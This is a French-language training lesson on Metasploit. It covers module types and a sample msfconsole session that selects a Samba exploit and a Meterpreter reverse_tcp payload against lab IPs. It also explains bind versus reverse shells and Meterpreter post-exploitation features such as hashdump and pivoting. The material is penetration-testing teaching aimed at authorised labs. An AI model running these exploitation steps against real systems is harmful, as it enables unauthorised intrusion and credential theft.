Metasploit Framework est la plateforme d'exploitation la plus utilisée en pentest : une base de milliers d'exploits prêts à l'emploi, un système de payloads modulaire, et des outils post-exploitation. Ce cours couvre le strict nécessaire pour l'utiliser de façon méthodique — jamais comme une boîte magique.

## Objectifs

- Comprendre la structure module / exploit / payload de Metasploit
- Utiliser msfconsole pour rechercher, configurer et lancer un exploit
- Comprendre la différence entre un payload bind et reverse shell

## Structure de Metasploit

Metasploit organise son contenu en modules typés :

- **Exploits** : le code qui tire parti d'une vulnérabilité spécifique
- **Payloads** : ce qui s'exécute une fois l'exploit réussi (obtenir un shell, exécuter une commande...)
- **Auxiliary** : modules qui ne délivrent pas de payload — scanners, brute-forcers, fuzzers
- **Post** : modules post-exploitation, une fois un accès déjà obtenu (énumération, pivoting...)

Cette séparation exploit/payload est la clé : un même exploit peut être combiné à différents payloads selon ce que tu veux obtenir après la compromission.

## Utilisation de base dans msfconsole

```
msfconsole

search type:exploit samba                 # chercher un exploit par mot-clé
use exploit/linux/samba/is_known_pipename  # sélectionner un module

show options                               # voir les paramètres requis (RHOSTS, RPORT...)
set RHOSTS 10.10.10.5
set LHOST 10.10.14.2                       # ton IP, pour recevoir la connexion retour

show payloads                              # payloads compatibles avec cet exploit
set payload linux/x86/meterpreter/reverse_tcp

check                                      # certains modules permettent de vérifier sans exploiter
run                                        # ou "exploit" — lance l'attaque
```

`show options` est la commande la plus importante : elle liste précisément ce qu'il manque avant de pouvoir lancer, et distingue les paramètres obligatoires (Required: yes) des optionnels.

## Bind shell vs reverse shell

**Bind shell** : le payload ouvre un port sur la machine cible et attend une connexion entrante de l'attaquant. Problème pratique : un firewall côté cible bloque souvent les connexions entrantes vers un nouveau port inattendu.

**Reverse shell** : le payload sur la cible initie **lui-même** la connexion vers l'attaquant (`LHOST`/`LPORT`). Comme il s'agit d'une connexion sortante, initiée depuis l'intérieur du réseau cible, elle passe beaucoup plus souvent les règles de firewall — c'est pourquoi le reverse shell est le choix par défaut en pentest moderne.

```
Bind :    Attaquant ----(se connecte à)----> Cible:4444
Reverse : Attaquant:4444 <----(se connecte)---- Cible
```

Avant de lancer un exploit avec un payload reverse, un multi/handler doit être en écoute pour recevoir la connexion (`exploit/multi/handler`, avec le même `LHOST`/`LPORT` que le payload configuré).

## Meterpreter

Meterpreter est un payload avancé qui offre un shell interactif riche en fonctionnalités post-exploitation directement disponibles : `sysinfo`, `getuid`, `hashdump`, `upload`/`download`, `screenshot`, pivoting réseau... Il tourne entièrement en mémoire (pas de fichier déposé sur le disque cible dans la plupart des cas), ce qui le rend plus discret qu'un simple shell de commande.

## Pièges fréquents

- Lancer un exploit sans avoir vérifié `show options` complètement — un `RHOSTS` ou `LHOST` mal configuré fait échouer silencieusement une attaque qui aurait dû fonctionner.
- Traiter Metasploit comme un outil "qui trouve les vulnérabilités" — il **exploite** des vulnérabilités déjà identifiées par la reconnaissance (Nmap, versions de service). La détection reste un travail manuel en amont.
- Oublier de démarrer le `multi/handler` avant de lancer un exploit configuré en reverse shell — la cible tente de se connecter, mais personne n'écoute.

## Pour le lab

Le module **TryHackMe Metasploit** fait pratiquer exactement ce cycle recherche → configuration → exploitation sur des machines vulnérables connues, en insistant sur la lecture de `show options` avant chaque lancement — l'habitude la plus importante à prendre ici.
